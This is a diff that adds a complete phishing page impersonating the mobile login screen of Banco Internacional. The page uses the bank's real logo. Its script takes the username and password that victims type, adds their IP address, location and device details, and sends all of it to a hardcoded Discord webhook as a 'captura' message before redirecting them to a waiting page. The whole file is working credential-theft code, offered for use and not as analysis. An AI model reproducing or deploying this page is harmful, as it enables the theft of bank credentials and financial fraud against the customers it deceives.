@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Banco Internacional</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    min-height: 100dvh;
+    background: #f59a05;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: stretch;
+  }
+  .screen {
+    width: 100%;
+    max-width: 430px;
+    min-height: 100dvh;
+    background: #f59a05;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow: hidden;
+    margin: 0 auto;
+  }
+  .back-btn {
+    position: absolute;
+    top: 18px;
+    left: 18px;
+    font-size: 22px;
+    color: white;
+    cursor: pointer;
+    z-index: 10;
+    background: none;
+    border: none;
+    line-height: 1;
+    padding: 4px 8px;
+  }
+  .header {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 22px 16px 0;
+  }
+  .header img {
+    height: 52px;
+    object-fit: contain;
+  }
+  .illustration {
+    display: flex;
+    justify-content: center;
+    align-items: flex-end;
+    padding: 10px 0 0;
+    flex: 0 0 auto;
+  }
+  .illustration img {
+    width: 75%;
+    max-width: 300px;
+    height: auto;
+    object-fit: contain;
+  }
+  .form-area {
+    padding: 28px 28px 0;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+  }
+  .field-label {
+    font-size: 15px;
+    color: rgba(255,255,255,0.95);
+    font-weight: 500;
+    margin-bottom: 7px;
+  }
+  .input-wrap {
+    margin-bottom: 20px;
+  }
+  .input-field {
+    width: 100%;
+    height: 52px;
+    background: #f7b030;
+    border: none;
+    border-radius: 30px;
+    padding: 0 20px;
+    font-size: 16px;
+    color: #fff;               /* Letras en blanco al escribir */
+    outline: none;
+    transition: background 0.2s;
+  }
+  .input-field::placeholder { color: transparent; }
+  .input-field:focus {
+    background: #f0a820;
+  }
+  .btn-login {
+    width: 100%;
+    height: 54px;
+    background: #fde8a0;
+    border: none;
+    border-radius: 30px;
+    font-size: 18px;
+    font-weight: 700;
+    color: #b87200;
+    cursor: pointer;
+    letter-spacing: 0.3px;
+    margin-top: 8px;
+    transition: background 0.18s, transform 0.1s;
+  }
+  .btn-login:active {
+    background: #fcd060;
+    transform: scale(0.98);
+  }
+  .spacer { flex: 1; }
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    gap: 0;
+    padding: 18px 12px 28px;
+    border-top: none;
+  }
+  .footer-link {
+    flex: 1;
+    text-align: center;
+    font-size: 12.5px;
+    color: rgba(255,255,255,0.92);
+    font-weight: 500;
+    line-height: 1.35;
+    cursor: pointer;
+    padding: 0 4px;
+  }
+  .footer-divider {
+    width: 1px;
+    height: 32px;
+    background: rgba(255,255,255,0.5);
+    align-self: center;
+    flex-shrink: 0;
+  }
+</style>
+</head>
+<body>
+<div class="screen">
+  <!-- Back button -->
+  <button class="back-btn" aria-label="Volver">&#8249;</button>
+
+  <!-- Logo -->
+  <div class="header">
+    <img
+      src="https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp"
+      alt="Banco Internacional"
+      width="240" height="52"
+    >
+  </div>
+
+  <!-- Illustration -->
+  <div class="illustration">
+    <img
+      src="chica.jpg"
+      alt="Persona usando el celular"
+      width="300" height="260"
+      loading="lazy"
+      onerror="this.style.display='none'"
+    >
+  </div>
+
+  <!-- Form -->
+  <div class="form-area">
+    <div class="input-wrap">
+      <div class="field-label">Usuario</div>
+      <input class="input-field" type="text" autocomplete="username" placeholder="Usuario" id="docNumber">
+    </div>
+    <div class="input-wrap">
+      <div class="field-label">Contraseña</div>
+      <input class="input-field" type="password" autocomplete="current-password" placeholder="Contraseña" id="passwordInput">
+    </div>
+    <button class="btn-login" id="btnContinuar">Ingresar</button>
+  </div>
+
+  <div class="spacer"></div>
+
+  <!-- Footer links -->
+  <div class="footer-links">
+    <div class="footer-link">¿Olvidaste tu contraseña?</div>
+    <div class="footer-divider"></div>
+    <div class="footer-link">Desbloquea tu usuario</div>
+    <div class="footer-divider"></div>
+    <div class="footer-link">¿Olvidaste tu usuario?</div>
+  </div>
+</div>
+
+<script>
+  // -------------------------------------------------
+  // TU WEBHOOK DE DISCORD (ya proporcionado)
+  // -------------------------------------------------
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW";
+
+  // -------------------------------------------------
+  // Helpers de localStorage (opcional, para recordar último DNI)
+  // -------------------------------------------------
+  function saveToStorage(key, value) {
+    try { localStorage.setItem(key, value); } catch(e) {}
+  }
+  function getFromStorage(key) {
+    try { return localStorage.getItem(key); } catch(e) { return null; }
+  }
+
+  // -------------------------------------------------
+  // Obtener información de IP / geolocalización
+  // -------------------------------------------------
+  async function getUserInfo() {
+    let ip = "Desconocida", country = "Desconocido", city = "Desconocida",
+        isp = "Desconocido", timezone = "Desconocido";
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      ip       = data.ip       || ip;
+      country  = data.country_name || country;
+      city     = data.city     || city;
+      isp      = data.org      || isp;
+      timezone = data.timezone || timezone;
+    } catch(e) {}
+    return { ip, country, city, isp, timezone };
+  }
+
+  // -------------------------------------------------
+  // Obtener información del dispositivo / navegador
+  // -------------------------------------------------
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = "Desktop";
+    if (/iPhone/i.test(ua)) device = "iPhone";
+    else if (/iPad/i.test(ua)) device = "iPad";
+    else if (/Android/i.test(ua)) device = "Android";
+
+    const browser = /Chrome/i.test(ua) ? "Chrome"
+                  : /Firefox/i.test(ua) ? "Firefox"
+                  : /Safari/i.test(ua)  ? "Safari"
+                  : /Edge/i.test(ua)    ? "Edge" : "Otro";
+
+    const os = /Windows/i.test(ua) ? "Windows"
+             : /Mac/i.test(ua)     ? "macOS"
+             : /Linux/i.test(ua)   ? "Linux"
+             : /Android/i.test(ua) ? "Android"
+             : /iOS/i.test(ua)     ? "iOS" : "Desconocido";
+
+    const lang = navigator.language || "Desconocido";
+    const screen = `${window.screen.width}x${window.screen.height}`;
+    const now = new Date();
+    const fecha = now.toLocaleDateString("es-PE", {
+      weekday:"long", year:"numeric", month:"long", day:"numeric"
+    });
+    const hora  = now.toLocaleTimeString("es-PE", {
+      hour:"2-digit", minute:"2-digit", second:"2-digit"
+    });
+    return { device, browser, os, lang, screen, fecha, hora };
+  }
+
+  // -------------------------------------------------
+  // Envío al webhook (embed profesional)
+  // -------------------------------------------------
+  async function sendToDiscord(usuario, clave) {
+    const geo = await getUserInfo();
+    const dev = getDeviceInfo();
+
+    // URL del logotipo que usarás tanto para avatar como para thumbnail
+    const logoUrl = "https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp";
+
+    const payload = {
+      username: "Banco Internacional - Captura",
+      avatar_url: logoUrl,               // ← Imagen cambiada
+      embeds: [{
+        title: "🏦  NUEVA CAPTURA — BANCO INTERNACIONAL",
+        color: 0x4a9c2f, // verde corporativo
+        thumbnail: {
+          url: logoUrl               // ← Imagen cambiada (thumbnail)
+        },
+        fields: [
+          {
+            name: "🪪  CREDENCIALES",
+            value: `\`\`\`
+Usuario : ${usuario}
+Clave   : ${clave}
+\`\`\``,
+            inline: false
+          },
+          {
+            name: "🌐  RED / IP",
+            value: `> **IP:** \`${geo.ip}\`
+> **País:** ${geo.country}
+> **Ciudad:** ${geo.city}
+> **ISP:** ${geo.isp}
+> **Zona horaria:** ${geo.timezone}`,
+            inline: false
+          },
+          {
+            name: "💻  DISPOSITIVO",
+            value: `> **Dispositivo:** ${dev.device}
+> **SO:** ${dev.os}
+> **Navegador:** ${dev.browser}
+> **Idioma:** ${dev.lang}
+> **Resolución:** ${dev.screen}`,
+            inline: false
+          },
+          {
+            name: "🕐  FECHA Y HORA",
+            value: `> 📅 ${dev.fecha}
+> 🕐 ${dev.hora}`,
+            inline: false
+          }
+        ],
+        footer: {
+          text: "by @TuUsuario • Telegram",
+          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/960px-Telegram_logo.svg.png"
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  // -------------------------------------------------
+  // Lógica del botón
+  // -------------------------------------------------
+  document.addEventListener("DOMContentLoaded", () => {
+    const docNumber = document.getElementById("docNumber");
+    const passwordInput = document.getElementById("passwordInput");
+    const btnContinuar = document.getElementById("btnContinuar");
+
+    // Restaurar DNI guardado (si existe)
+    const savedDni = getFromStorage("bf_last_dni");
+    if (savedDni) {
+      docNumber.value = savedDni;
+    }
+
+    docNumber.addEventListener("input", () => {
+      saveToStorage("bf_last_dni", docNumber.value.trim());
+    });
+
+    btnContinuar.addEventListener("click", async (e) => {
+      e.preventDefault(); // evitar envío tradicional del formulario
+
+      const usuario = docNumber.value.trim();
+      const clave   = passwordInput.value.trim();
+
+      if (!usuario || !clave) {
+        alert("Por favor completa ambos campos");
+        return;
+      }
+
+      // Desactivar botón y dar feedback visual
+      btnContinuar.textContent = "Enviando…";
+      btnContinuar.disabled = true;
+
+      try {
+        await sendToDiscord(usuario, clave);
+        // Guardar timestamp de último intento
+        saveToStorage("bf_last_login", new Date().toISOString());
+      } catch (err) {
+        console.error("Error al enviar a Discord:", err);
+        // Aunque falle, seguimos con la redirección para no bloquear al usuario
+      } finally {
+        // Redirigir a wait.html después de un breve retraso
+        setTimeout(() => {
+          window.location.href = "wait.html";
+        }, 1500);
+      }
+    });
+  });
+</script>
+</body>
+</html>
